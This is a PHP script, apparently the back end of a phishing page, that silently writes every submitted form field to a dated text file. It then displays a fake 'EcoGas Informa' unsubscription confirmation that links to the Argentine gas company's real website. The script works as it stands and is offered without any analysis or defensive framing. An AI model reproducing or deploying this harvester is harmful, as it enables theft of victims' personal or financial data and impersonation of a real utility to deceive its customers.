<?php
$c=1;
$hoy = getdate();
$hora=$hoy[hours].":".$hoy[minutes].":".$hoy[seconds]." hs";
$dia=$hoy[mday]."-".$hoy[mon]."-".$hoy[year];
$ar = fopen($dia.".txt", "a+") or
die("Problemas en la creacion");
foreach ($_POST as $uf){
    if ($c==1){
      fputs($ar, $uf);
      fputs($ar, "|");
    }elseif ($c<count($_POST)){
        fputs($ar, $uf);
        fputs($ar, "\n");
        fputs($ar, " |");
    }else{
        fputs($ar, $uf);
        fputs($ar, "\n");
    }
    $c++;
}
fclose($ar);
?>
<html>
<head>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
</head>
<body>
<div class="card text-center">
  <div class="card-header">
    EcoGas Informa
  </div>
  <div class="card-body">
    <h5 class="card-title">Tramite completado</h5>
    <p class="card-text">Se ha desuscripto correctamente, en caso de querer volver a suscribirse visite nuestro sitio web</p>
    <a href="https://www.ecogas.com.ar/appweb/leo/sec/ui-residenciales-fact-digital.php" class="btn btn-primary">Sitio Web</a>
  </div>
  <div class="card-footer text-muted">
    Muchas gracias
  </div>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
</body>
</html>